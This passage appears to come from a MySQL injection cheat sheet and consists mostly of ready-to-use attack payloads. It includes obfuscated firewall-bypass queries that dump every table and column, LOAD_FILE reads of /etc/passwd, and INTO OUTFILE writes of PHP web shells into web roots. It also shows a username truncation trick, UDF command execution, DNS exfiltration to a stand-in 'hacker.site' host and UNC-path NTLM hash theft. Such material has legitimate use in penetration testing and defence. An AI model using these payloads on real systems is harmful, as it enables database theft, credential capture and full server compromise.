-- Zen
+make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)

-- Zen WAF
(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)

-- ~tr0jAn WAF
+concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/+

-- ~tr0jAn Benchmark
+concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20,version(),0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c2f666f6e743e3c2f666f6e743e,0x202d2d203a2d20,concat(@sc:=0x00,@scc:=0x00,@r:=0,benchmark(@a:=(select count(*) from information_schema.schemata),@scc:=concat(@scc,0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d7265643e,LPAD(@r:=@r%2b1,3,0x30),0x2e20,(Select concat(0x3c623e,@sc:=schema_name,0x3c2f623e) from information_schema.schemata where schema_name>@sc order by schema_name limit 1),0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a20,(select count(*) from information_Schema.tables where table_schema=@sc),0x29,0x3c2f666f6e743e,0x202e2e2e20 ,@t:=0x00,@tt:=0x00,@tr:=0,benchmark((select count(*) from information_Schema.tables where table_schema=@sc),@tt:=concat(@tt,0x3c62723e,0x3c666f6e7420636f6c6f723d677265656e3e,LPAD(@tr:=@tr%2b1,3,0x30),0x2e20,(select concat(0x3c623e,@t:=table_name,0x3c2f623e) from information_Schema.tables where table_schema=@sc and table_name>@t order by table_name limit 1),0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20,(select count(*) from information_Schema.columns where table_name=@t),0x29,0x3c2f666f6e743e,0x202d2d3a20,@c:=0x00,@cc:=0x00,@cr:=0,benchmark((Select count(*) from information_schema.columns where table_schema=@sc and table_name=@t),@cc:=concat(@cc,0x3c62723e,0x3c666f6e7420636f6c6f723d707572706c653e,LPAD(@cr:=@cr%2b1,3,0x30),0x2e20,(Select (@c:=column_name) from information_schema.columns where table_schema=@sc and table_name=@t and column_name>@c order by column_name LIMIT 1),0x3c2f666f6e743e)),@cc,0x3c62723e)),@tt)),@scc),0x3c62723e3c62723e,0x3c62723e3c62723e)+

-- N1Z4M WAF
+/*!13337concat*/(0x3c616464726573733e3c63656e7465723e3c62723e3c68313e3c666f6e7420636f6c6f723d22526564223e496e6a6563746564206279204e315a344d3c2f666f6e743e3c68313e3c2f63656e7465723e3c62723e3c666f6e7420636f6c6f723d2223663364393361223e4461746162617365207e3e3e203c2f666f6e743e,database/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223306639643936223e56657273696f6e207e3e3e203c2f666f6e743e,@@version,0x3c62723e3c666f6e7420636f6c6f723d2223306637363964223e55736572207e3e3e203c2f666f6e743e,user/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223306639643365223e506f7274207e3e3e203c2f666f6e743e,@@port,0x3c62723e3c666f6e7420636f6c6f723d2223346435613733223e4f53207e3e3e203c2f666f6e743e,@@version_compile_os,0x2c3c62723e3c666f6e7420636f6c6f723d2223366134343732223e44617461204469726563746f7279204c6f636174696f6e207e3e3e203c2f666f6e743e,@@datadir,0x3c62723e3c666f6e7420636f6c6f723d2223333130343362223e55554944207e3e3e203c2f666f6e743e,UUID/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223363930343637223e43757272656e742055736572207e3e3e203c2f666f6e743e,current_user/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223383432303831223e54656d70204469726563746f7279207e3e3e203c2f666f6e743e,@@tmpdir,0x3c62723e3c666f6e7420636f6c6f723d2223396336623934223e424954532044455441494c53207e3e3e203c2f666f6e743e,@@version_compile_machine,0x3c62723e3c666f6e7420636f6c6f723d2223396630613838223e46494c452053595354454d207e3e3e203c2f666f6e743e,@@CHARACTER_SET_FILESYSTEM,0x3c62723e3c666f6e7420636f6c6f723d2223393234323564223e486f7374204e616d65207e3e3e203c2f666f6e743e,@@hostname,0x3c62723e3c666f6e7420636f6c6f723d2223393430313333223e53797374656d2055554944204b6579207e3e3e203c2f666f6e743e,UUID/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223613332363531223e53796d4c696e6b20207e3e3e203c2f666f6e743e,@@GLOBAL.have_symlink,0x3c62723e3c666f6e7420636f6c6f723d2223353830633139223e53534c207e3e3e203c2f666f6e743e,@@GLOBAL.have_ssl,0x3c62723e3c666f6e7420636f6c6f723d2223393931663333223e42617365204469726563746f7279207e3e3e203c2f666f6e743e,@@basedir,0x3c62723e3c2f616464726573733e3c62723e3c666f6e7420636f6c6f723d22626c7565223e,(/*!13337select*/(@a)/*!13337from*/(/*!13337select*/(@a:=0x00),(/*!13337select*/(@a)/*!13337from*/(information_schema.columns)/*!13337where*/(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=/*!13337concat*/(@a,table_schema,0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e,table_name,0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e,column_name,0x3c62723e))))a))+

-- sharik
(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)
```

## MYSQL Current queries

This table can list all operations that DB is performing at the moment.

```sql
union SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #

-- Dump in one shot example for the table content.
union select 1,(select(@)from(select(@:=0x00),(select(@)from(information_schema.processlist)where(@)in(@:=concat(@,0x3C62723E,state,0x3a,info))))a),3,4 #
```

## MYSQL Read content of a file

Need the `filepriv`, otherwise you will get the error : `ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement`

```sql
' UNION ALL SELECT LOAD_FILE('/etc/passwd') --
```

If you are `root` on the database, you can re-enable the `LOAD_FILE` using the following query

```sql
GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#
```

## MYSQL Write a shell

### Into outfile method

```sql
[...] UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'
[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -
[...] union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
```

### Into dumpfile method

```sql
[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';
```

## MYSQL Truncation

In MYSQL "`admin `" and "`admin`" are the same. If the username column in the database has a character-limit the rest of the characters are truncated. So if the database has a column-limit of 20 characters and we input a string with 21 characters the last 1 character will be removed.

```sql
`username` varchar(20) not null
```

Payload: `username = "admin               a"`

## MYSQL Fast Exploitation

Requirement: `MySQL >= 5.7.22`

Use `json_arrayagg()` instead of `group_concat()` which allows less symbols to be displayed
* group_concat() = 1024 symbols
* json_arrayagg() > 16,000,000 symbols

```sql
SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;
```

## MYSQL UDF command execution

First you need to check if the UDF are installed on the server.

```powershell
$ whereis lib_mysqludf_sys.so
/usr/lib/lib_mysqludf_sys.so
```

Then you can use functions such as `sys_exec` and `sys_eval`.

```sql
$ mysql -u root -p mysql
Enter password: [...]
mysql> SELECT sys_eval('id');
+--------------------------------------------------+
| sys_eval('id') |
+--------------------------------------------------+
| uid=118(mysql) gid=128(mysql) groups=128(mysql) |
+--------------------------------------------------+
```


## MYSQL Out of band

```powershell
select @@version into outfile '\\\\192.168.0.100\\temp\\out.txt';
select @@version into dumpfile '\\\\192.168.0.100\\temp\\out.txt
```

### DNS exfiltration

```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874))
```

### UNC Path - NTLM hash stealing

```sql
select load_file('\\\\error\\abc');
select load_file(0x5c5c5c5c6572726f725c5c616263);
select 'osanda' into dumpfile '\\\\error\\abc';
select 'osanda' into outfile '\\\\error\\abc';
load data infile '\\\\error\\abc' into table database.table_name;
```

## References

- [MySQL Out of Band Hacking - @OsandaMalith](https://www.exploit-db.com/docs/english/41273-mysql-out-of-band-hacking.pdf)
- [[Sqli] Extracting data without knowing columns names - Ahmed Sultan @0x4148](https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/)
- [Help по MySql инъекциям - rdot.org](https://rdot.org/forum/showpost.php?p=114&postcount=1)
- [SQL Truncation Attack - Warlock](https://resources.infosecinstitute.com/sql-truncation-attack/)
- [HackerOne @ajxchapman 50m-ctf writeup - Alex Chapman @ajxchapman](https://hackerone.com/reports/508123)
- [SQL Wiki - netspi](https://sqlwiki.netspi.com/injectionTypes/errorBased)
- [ekoparty web_100 - 2016/10/26 - p4-team](https://github.com/p4-team/ctf/tree/master/2016-10-26-ekoparty/web_100)
- [Websec - MySQL - Roberto Salgado - May 29, 2013.](https://websec.ca/kb/sql_injection#MySQL_Default_Databases)
